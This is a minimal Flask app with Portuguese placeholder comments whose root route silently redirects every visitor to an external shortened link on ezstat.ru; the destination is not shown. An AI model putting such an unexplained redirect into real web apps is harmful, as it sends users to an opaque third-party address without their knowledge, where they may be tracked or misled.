from flask import Flask, render_template, url_for, request, jsonify, Response, redirect

app = Flask(__name__)
# Outras configurações e rotas

@app.route('/')
def index():
   return redirect('https://ezstat.ru/29EDq6', code=302)

# Outras rotas e lógica do aplicativo

if __name__ == "__main__":
  app.run(debug=False, host='0.0.0.0', port=8080)
